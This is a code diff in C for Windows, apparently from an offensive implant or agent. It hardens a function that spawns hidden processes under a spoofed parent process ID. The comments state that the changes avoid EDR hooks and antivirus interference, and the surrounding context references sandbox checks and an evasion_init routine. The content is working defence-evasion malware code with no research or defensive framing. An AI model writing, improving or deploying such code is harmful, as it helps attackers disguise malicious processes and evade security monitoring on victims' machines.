@@ -92,80 +92,109 @@ void sandbox_check(void) {
 
 /* ── PPID spoofing — spawn a process with a fake parent PID ─────────────── */
 int spawn_with_ppid(const char *cmd, const char *parent_name) {
-    /* Find the parent PID by process name */
-    DWORD parent_pid = 0;
+    char lp[MAX_PATH] = {0};
+    for (int i = 0; parent_name[i] && i < MAX_PATH-1; i++)
+        lp[i] = (char)tolower((unsigned char)parent_name[i]);
+
+    /* Walk the process list and try each matching process in order.
+     * Skip PID 0 (Idle) and PID 4 (System) — they cannot be opened.
+     * Try all candidates so a protected/exited process doesn't block us. */
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snap == INVALID_HANDLE_VALUE) return 0;
 
     PROCESSENTRY32W pe;
     pe.dwSize = sizeof(pe);
+
+    /* Collect up to 8 candidate PIDs without holding the snapshot open */
+    DWORD candidates[8] = {0};
+    int   ncand = 0;
     if (Process32FirstW(snap, &pe)) {
         do {
+            if (pe.th32ProcessID == 0 || pe.th32ProcessID == 4) continue;
             char narrow[MAX_PATH] = {0};
-            WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, narrow, sizeof(narrow)-1, NULL, NULL);
-            char lo[MAX_PATH] = {0}, lp[MAX_PATH] = {0};
-            for (int i = 0; narrow[i] && i < MAX_PATH-1; i++) lo[i] = (char)tolower((unsigned char)narrow[i]);
-            for (int i = 0; parent_name[i] && i < MAX_PATH-1; i++) lp[i] = (char)tolower((unsigned char)parent_name[i]);
-            if (strcmp(lo, lp) == 0) { parent_pid = pe.th32ProcessID; break; }
+            WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1,
+                                narrow, sizeof(narrow)-1, NULL, NULL);
+            char lo[MAX_PATH] = {0};
+            for (int i = 0; narrow[i] && i < MAX_PATH-1; i++)
+                lo[i] = (char)tolower((unsigned char)narrow[i]);
+            if (strcmp(lo, lp) == 0 && ncand < 8)
+                candidates[ncand++] = pe.th32ProcessID;
         } while (Process32NextW(snap, &pe));
     }
     CloseHandle(snap);
-    if (!parent_pid) return 0;
+    if (!ncand) return 0;
 
-    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
+    /* Try each candidate until one succeeds */
+    HANDLE hParent = NULL;
+    for (int i = 0; i < ncand; i++) {
+        hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, candidates[i]);
+        if (hParent) break;
+    }
     if (!hParent) return 0;
 
     SIZE_T attr_sz = 0;
     InitializeProcThreadAttributeList(NULL, 1, 0, &attr_sz);
     LPPROC_THREAD_ATTRIBUTE_LIST attrList =
-        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_sz);
+        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attr_sz);
     if (!attrList) { CloseHandle(hParent); return 0; }
 
     if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attr_sz)) {
         HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return 0;
     }
-    UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
-        &hParent, sizeof(hParent), NULL, NULL);
+    if (!UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+            &hParent, sizeof(hParent), NULL, NULL)) {
+        DeleteProcThreadAttributeList(attrList);
+        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return 0;
+    }
 
     STARTUPINFOEXW siEx;
     ZeroMemory(&siEx, sizeof(siEx));
     siEx.StartupInfo.cb = sizeof(siEx);
     siEx.lpAttributeList = attrList;
 
-    int wcmd_len = MultiByteToWideChar(CP_ACP, 0, cmd, -1, NULL, 0);
+    int wcmd_len = MultiByteToWideChar(CP_UTF8, 0, cmd, -1, NULL, 0);
+    if (wcmd_len <= 0) {
+        DeleteProcThreadAttributeList(attrList);
+        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return 0;
+    }
     WCHAR *wcmd = (WCHAR*)HeapAlloc(GetProcessHeap(), 0, wcmd_len * sizeof(WCHAR));
     if (!wcmd) {
         DeleteProcThreadAttributeList(attrList);
         HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return 0;
     }
-    MultiByteToWideChar(CP_ACP, 0, cmd, -1, wcmd, wcmd_len);
+    MultiByteToWideChar(CP_UTF8, 0, cmd, -1, wcmd, wcmd_len);
 
     PROCESS_INFORMATION pi;
     ZeroMemory(&pi, sizeof(pi));
+
+    /* No CREATE_SUSPENDED — resume flag is an extra EDR hook target and is
+     * unnecessary for PPID spoofing.  CREATE_NEW_PROCESS_GROUP isolates
+     * Ctrl+C / console signal inheritance from the agent's session. */
     BOOL ok = CreateProcessW(NULL, wcmd, NULL, NULL, FALSE,
-        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
+        EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW,
         NULL, NULL, &siEx.StartupInfo, &pi);
+    DWORD cp_err = GetLastError();   /* capture immediately before any other call */
 
     HeapFree(GetProcessHeap(), 0, wcmd);
     DeleteProcThreadAttributeList(attrList);
     HeapFree(GetProcessHeap(), 0, attrList);
     CloseHandle(hParent);
-    if (!ok) return 0;
 
-    ResumeThread(pi.hThread);
+    if (!ok) { SetLastError(cp_err); return 0; }
+
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
     return 1;
 }
 
-/* Thread wrapper so spawn_with_ppid runs isolated from the main dispatcher.
- * WaitForSingleObject with timeout in the caller handles hangs (AV-blocking
- * CreateProcessW); if the thread raises an unhandled exception the process-
- * level VEH set in evasion_init() logs it and returns CONTINUE_SEARCH so
- * Windows can terminate the thread but not the whole process.               */
+/* Thread wrapper — SEH via AddVectoredExceptionHandler (registered in
+ * evasion_init) catches any exception from inside CreateProcessW.
+ * The error from CreateProcessW is captured inside spawn_with_ppid and
+ * stored in w->err so WaitForSingleObject + CloseHandle can't clobber it. */
 DWORD WINAPI ppid_worker(LPVOID arg) {
     PpidWork *w = (PpidWork *)arg;
-    w->ok = spawn_with_ppid(w->cmd, w->parent);
+    w->ok  = spawn_with_ppid(w->cmd, w->parent);
+    w->err = (w->ok == 1) ? 0 : GetLastError();
     return 0;
 }
 
